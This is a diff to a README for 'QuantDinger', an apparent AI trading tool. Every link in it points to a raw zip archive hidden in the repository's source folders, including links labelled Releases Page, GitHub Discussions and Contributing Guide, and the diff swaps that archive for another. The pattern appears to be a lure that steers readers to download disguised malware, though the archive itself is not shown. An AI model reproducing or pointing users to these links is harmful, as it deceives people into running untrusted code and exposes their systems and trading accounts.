@@ -1,6 +1,6 @@
 # 🚀 QuantDinger - AI Trading Made Easy
 
-[![Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip)](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip)
+[![Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip)](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ To use QuantDinger, follow these steps:
 
 1. **Visit the Release Page**: Click the download link below to access the latest version.
    
-   [Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip)
+   [Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip)
 
 2. **Select Your Version**: Choose the version that is compatible with your operating system. 
 
@@ -22,7 +22,7 @@ To use QuantDinger, follow these steps:
 
 ## 📥 Download & Install
 
-You can easily download QuantDinger by visiting our [Releases Page](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip). 
+You can easily download QuantDinger by visiting our [Releases Page](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip). 
 
 1. Once on the page, you will see a list of available versions. Click on the version you wish to download.
 2. Depending on the file type:
@@ -56,18 +56,18 @@ If you need assistance, check our documentation on the GitHub Wiki or reach out 
 
 ## 🌐 Community and Support
 
-Join the QuantDinger community! Share your experiences, insights, and tips with other users. Connect via our [GitHub Discussions](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip) or explore resources shared by other traders.
+Join the QuantDinger community! Share your experiences, insights, and tips with other users. Connect via our [GitHub Discussions](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip) or explore resources shared by other traders.
 
 ## 🔄 Updates
 
-Stay up to date with the latest features, improvements, and bug fixes. You can find all release notes in the [Releases Page](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip) as well.
+Stay up to date with the latest features, improvements, and bug fixes. You can find all release notes in the [Releases Page](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip) as well.
 
 ## ⭐ Contributing
 
-We welcome contributions from everyone! If you would like to contribute, check our [Contributing Guide](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip) for how to get started.
+We welcome contributions from everyone! If you would like to contribute, check our [Contributing Guide](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip) for how to get started.
 
 ## 🎉 Thank You
 
 Thank you for choosing QuantDinger as your trading platform. We are excited to see how you will use our tool to enhance your trading strategies. Happy trading! 
 
-[Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/core/Dinger-Quant-alecost.zip)
+[Download QuantDinger](https://github.com/Sammy18032100/QuantDinger/raw/refs/heads/main/quantdinger_vue/src/mock/services/Dinger_Quant_v2.5.zip)
